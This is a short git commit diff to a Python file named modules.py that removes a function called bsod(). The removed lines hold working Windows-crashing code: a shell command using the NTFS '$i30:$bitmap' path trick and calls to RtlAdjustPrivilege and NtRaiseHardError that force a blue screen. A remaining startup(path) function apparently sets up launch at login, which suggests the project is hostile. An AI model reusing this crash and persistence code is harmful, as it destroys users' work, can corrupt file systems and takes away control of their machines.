37ea19ab75cfc31bad5622a4009b90082482581b
PolDones <154332339+PolDones@users.noreply.github.com>
2024-04-04 18:16:12 +0200

    Update modules.py

--- modules.py
+++ modules.py
@@ -5,12 +5,6 @@ import ctypes
 import subprocess
 import ctypes.wintypes
 
-def bsod():
-	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
-	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
-
-
 def startup(path):
 	USER_NAME = getpass.getuser()
 	global bat_path
